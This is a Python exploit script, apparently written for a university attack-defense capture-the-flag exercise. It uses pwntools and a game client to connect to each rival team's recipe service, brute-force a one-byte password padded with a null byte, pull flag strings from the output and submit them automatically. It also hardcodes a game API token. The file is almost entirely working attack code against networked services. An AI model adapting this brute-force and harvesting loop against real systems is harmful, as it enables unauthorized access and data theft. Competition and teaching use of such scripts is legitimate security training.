from swpag_client import Team
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'debug'

t = Team("http://actf4_team.cse545.io/", "A17sryrF7bFDVR6D4niP")

for i in range(0,256):
    var=hex(i)
    for team in t.get_targets(1):
        host=team['hostname']
        recipe_id=team['flag_id']
        p=pwn.remote(host,'10001')
        try:
            p.recvuntil('Print Recipe')
            #p.recvline() #"Your choice (1-3): "
            #p.clean()
            p.sendline('P')
            p.recvuntil('password')
            password=var+'\x00'
            p.sendline(recipe_id)
            p.sendline(password)

            #flag=[]

            while True:
                p.recvuntil('FLG')
                fflag=p.recv(13)
                fflag="FLG" + fflag
                #flag.append(fflag)
                print(fflag)
                t.submit_flag([fflag])
        except EOFError as error:
            break